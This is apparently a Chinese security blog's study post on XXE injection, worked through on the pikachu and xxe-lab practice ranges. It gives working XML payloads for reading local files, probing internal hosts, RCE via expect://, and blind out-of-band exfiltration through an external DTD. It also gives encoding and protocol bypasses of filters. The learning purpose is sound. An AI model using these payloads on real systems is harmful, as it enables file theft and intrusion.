<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png"><link rel="icon" type="image/png" sizes="32x32" href="/images/%E6%88%91%E7%9A%84%E5%AD%A6%E4%B9%A0%20(1).png"><link rel="icon" type="image/png" sizes="16x16" href="/images/%E6%88%91%E7%9A%84%E5%AD%A6%E4%B9%A0.png"><link rel="mask-icon" href="/images/logo.svg" color="#222"><meta name="baidu-site-verification" content="code-ohRVdKq7d5"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=微软雅黑:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css"><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"www.zymstudy.club",root:"/",scheme:"Gemini",version:"7.8.0",exturl:!1,sidebar:{position:"left",display:"post",padding:18,offset:12,onmobile:!1},copycode:{enable:!0,show_result:"ftrue",style:"flat"},back2top:{enable:!0,sidebar:!0,scrollpercent:!0},bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!0,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},algolia:{hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},path:"search.xml"}</script><meta name="description" content="生活日常随笔"><meta property="og:type" content="website"><meta property="og:title" content="猪哥的博客"><meta property="og:url" content="https://www.zymstudy.club/page/2/index.html"><meta property="og:site_name" content="猪哥的博客"><meta property="og:description" content="生活日常随笔"><meta property="og:locale" content="zh_CN"><meta property="article:author" content="zym"><meta property="article:tag" content="学习随笔"><meta name="twitter:card" content="summary"><link rel="canonical" href="https://www.zymstudy.club/page/2/"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!0,isPost:!1,lang:"zh-CN"}</script><title>猪哥的博客</title><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?63a74bc13be305eea159120a99117598";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span><h1 class="site-title">猪哥的博客</h1><span class="logo-line-after"><i></i></span></a><p class="site-subtitle" itemprop="description">25了还没去过星巴克的可怜猪哥</p></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul id="menu" class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签<span class="badge">17</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>分类<span class="badge">6</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="acchive fa-fw"></i>归档<span class="badge">48</span></a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div id="search-result"><div id="no-result"><i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></div></header><div class="reading-progress-bar"></div><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content index posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.zymstudy.club/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/Panda.jpg"><meta itemprop="name" content="zym"><meta itemprop="description" content="生活日常随笔"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="猪哥的博客"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/" class="post-title-link" itemprop="url">XXE&XML之利用检测绕过全解</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2022-03-30 15:44:04 / 修改时间：21:52:07" itemprop="dateCreated datePublished" datetime="2022-03-30T15:44:04+08:00">2022-03-30</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全渗透学习</span></a> </span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>6.8k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>6 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="XXE-amp-XML之利用检测绕过全解"><a href="#XXE-amp-XML之利用检测绕过全解" class="headerlink" title="XXE&amp;XML之利用检测绕过全解"></a>XXE&amp;XML之利用检测绕过全解</h1><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image1.webp" alt="image1"></p><h2 id="一-XML原理分析"><a href="#一-XML原理分析" class="headerlink" title="一.XML原理分析"></a>一.XML原理分析</h2><h3 id="1-XML和XXE区别"><a href="#1-XML和XXE区别" class="headerlink" title="1.XML和XXE区别"></a>1.XML和XXE区别</h3><p>XML 被设计为<strong>传输和存储</strong>数据，XML 文档结构包括 <strong>XML 声明</strong>、<strong>DTD 文档类型定义（可选）</strong>、<strong>文档元素</strong>，其焦点是<strong>数据的内容</strong>，其把数据<strong>从 HTML 分离</strong>，是独立于软件和硬件的信息传输工具。</p><p>XXE 漏洞全称XML External Entity Injection，即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序<strong>解析 XML 输入时，没有禁止外部实体的加载</strong>，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p><h3 id="2-XML和HTML的区别"><a href="#2-XML和HTML的区别" class="headerlink" title="2.XML和HTML的区别"></a>2.XML和HTML的区别</h3><p>XML 与 HTML 的主要差异：XML 被设计为<strong>传输和存储</strong>数据，其焦点是数据的<strong>内容</strong>。HTML 被设计用来<strong>显示</strong>数据，其焦点是数据的<strong>外观</strong>。HTML 旨在显示信息 ，而 XML 旨在传输信息。</p><p><strong>XML典型代码：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [ &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span> &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span> &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span> &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">head</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span> &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span> &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>DTD：</strong></p><p>文档类型定义（DTD）可定义合法的XML文档构建模块<br>它使用一系列合法的元素来定义文档的结构<br>DTD可被成行地声明于XML文档中，也可作为一个外部引用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(1)内部的DOCTYPE声明</span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br><span class="line"></span><br><span class="line">(2)外部文档声明</span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;文件名&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>DTD实体：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(1)内部实体声明</span><br><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="meta-string">&quot;实体的值&quot;</span>&gt;</span></span><br><span class="line">(2)外部实体声明</span><br><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;URI&quot;</span>&gt;</span></span><br><span class="line">(3)参数实体声明</span><br><span class="line"><span class="meta">&lt;!ENTITY %实体名称 <span class="meta-string">&quot;实体的值&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY %实体名称 <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;URI&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="二-pikachu靶场——XML数据传输测试（回显，玩法，协议，引入）"><a href="#二-pikachu靶场——XML数据传输测试（回显，玩法，协议，引入）" class="headerlink" title="二.pikachu靶场——XML数据传输测试（回显，玩法，协议，引入）"></a>二.pikachu靶场——XML数据传输测试（回显，玩法，协议，引入）</h2><h3 id="1-各种协议的脚本适用环境"><a href="#1-各种协议的脚本适用环境" class="headerlink" title="1.各种协议的脚本适用环境"></a>1.各种协议的脚本适用环境</h3><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image2.png" alt="image2"></p><h3 id="2-进入靶场"><a href="#2-进入靶场" class="headerlink" title="2.进入靶场"></a>2.进入靶场</h3><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image3.png" alt="image3"></p><h3 id="3-玩法1——读取文件"><a href="#3-玩法1——读取文件" class="headerlink" title="3.玩法1——读取文件"></a>3.玩法1——读取文件</h3><p>用file伪协议读取c盘的1.txt文件，当然这里的伪协议是隐藏在XML的文档实体中</p><p>这种是有回显的类型的漏洞</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c://1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">//xxe为变量，读取1.txt</span><br><span class="line">//打印出来</span><br><span class="line">//用file协议读取指定路径的文件</span><br></pre></td></tr></table></figure><p>显示结果</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image4.png" alt="image4"></p><h3 id="4-玩法2——内网探针或者攻击内网应用（触发漏洞地址）"><a href="#4-玩法2——内网探针或者攻击内网应用（触发漏洞地址）" class="headerlink" title="4.玩法2——内网探针或者攻击内网应用（触发漏洞地址）"></a>4.玩法2——内网探针或者攻击内网应用（触发漏洞地址）</h3><p>如下脚本，将其复制粘贴，提交</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">rabbit</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.176.128:10086/1.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;rabbit;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p>返回文件内容，说明内网中192.168.176.128服务器上，1.txt文件是存在的，也可以说10086端口是开放的，因此这里这个xxe漏洞，可以实现内网探针。</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image5.png" alt="image5"></p><p>如果是其他脚本文件，例如php脚本，则会执行这个脚本。此处一个脚本xuliehua.php</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image6.png" alt="image6"></p><p>会报执行结果</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image7.png" alt="image7"></p><p>如果文件不存在，就会报错，比如此处改为不存在的giao.txt，服务器返回一行报错信息。</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image8.png" alt="image8"></p><h3 id="5-玩法3——RCE"><a href="#5-玩法3——RCE" class="headerlink" title="5.玩法3——RCE"></a>5.玩法3——RCE</h3><p>该CASE是在安装expect扩展的PHP环境里执行系统命令</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;expect://id&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于本地环境未安装expect扩展，因此该玩法未测试。</p><h3 id="6-玩法4——引入外部实体dtd"><a href="#6-玩法4——引入外部实体dtd" class="headerlink" title="6.玩法4——引入外部实体dtd"></a>6.玩法4——引入外部实体dtd</h3><p>访问本地的evil2.dtd文件（这个是XML的格式文件，访问该文件就会以XML格式执行）</p><p>在evil2.dtd文件中，写入XML的伪协议代码：访问本地c盘的1.txt文件</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image9.png" alt="image9"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1:10086/evil2.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">//引入外部实体dtd，dtd就是xml的后缀，识别为xml格式</span><br><span class="line">//如果设置了禁止外部实体引用，将会失效</span><br></pre></td></tr></table></figure><p><strong>显示结果：</strong></p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image10.png" alt="image10"></p><p>引入外部实体dtd，核心代码在drd文件中，一方面是为了绕过一些服务器的限制，另一方面是为了自定义一些攻击代码，类似于远程文件包含漏洞。如下图，成功回显服务器上文件内容。</p><h3 id="7-玩法5——无回显——读取文件"><a href="#7-玩法5——无回显——读取文件" class="headerlink" title="7.玩法5——无回显——读取文件"></a>7.玩法5——无回显——读取文件</h3><p><strong>大致步骤：</strong></p><ol><li><p>第一步：读取test.txt文件的内容（端口根目录），然后base64加密赋值给变量file</p></li><li><p>第二步：访问自己本地的test.dtd文件（貌似这里也可以说内网的其它电脑，我猜测是本地，应为要自己伪造test.dtd文件才行），以XML格式执行本地的test.dtd文件</p></li><li><p>第三步：将本地test.txt文件的加密内容赋值给data变量。然后再通过日志的读取或者文件的接受变量来获取靶场的1.txt的文件的内容</p></li></ol><p>首先pikachu注释掉回显代码，构造无回显的环境</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image11.png" alt="image11"></p><p>如下脚本：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=c://1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1:10086/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>本地服务器192.168.176.128上构造test.dtd：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">payload</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://127.0.0.1:10086/?data=%file;&#x27;&gt;&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure><p>此时把脚本复制粘贴，提交，服务器不再返回任何信息</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image12.png" alt="image12"></p><p>本地开启日志，查找日志就可以看到test.txt数据了。</p><p>查看日志，没有发现BASE64加密的数据（<strong>这里问题没弄懂</strong>）</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image13.png" alt="image13"></p><h3 id="8-玩法6——协议——读文件（绕过）"><a href="#8-玩法6——协议——读文件（绕过）" class="headerlink" title="8.玩法6——协议——读文件（绕过）"></a>8.玩法6——协议——读文件（绕过）</h3><ul><li>ENTITY、SYSTEM、file等关键词被过滤–&gt;使用编码方式绕过：UTF-16BE</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml</span><br></pre></td></tr></table></figure><ul><li>http被过滤–&gt;可以使用其他协议绕过，比如data://协议、file://协议加文件上传、php://filter协议加文件上传</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [ <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="9-如何判断是什么过滤？"><a href="#9-如何判断是什么过滤？" class="headerlink" title="9.如何判断是什么过滤？"></a>9.如何判断是什么过滤？</h3><p>构造各种payload进行尝试（网上有字典，构造脚本去跑就行）</p><h2 id="三-xxe-lab靶场登陆框——xml数据传输测试——检测发现"><a href="#三-xxe-lab靶场登陆框——xml数据传输测试——检测发现" class="headerlink" title="三.xxe-lab靶场登陆框——xml数据传输测试——检测发现"></a>三.xxe-lab靶场登陆框——xml数据传输测试——检测发现</h2><p>靶场下载地址：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a></p><h3 id="1-进入靶场"><a href="#1-进入靶场" class="headerlink" title="1.进入靶场"></a>1.进入靶场</h3><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image14.png" alt="image14"></p><p>爬虫分析</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image15.png" alt="image15"></p><p>在请求数据包里面搜索关键字XML（发现一个）</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image16.png" alt="image16"></p><p>发现post传输的数据为xml格式</p><p><img src="/2022/03/30/XXE-XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%85%A8%E8%A7%A3/image17.png" alt="image17"></p><h3 id="2-结合post传输构造payload语句"><a href="#2-结合post传输构造payload语句" class="headerlink" title="2.结合post传输构造payload语句"></a>2.结合post传输构造payload语句</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Mikasa</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img 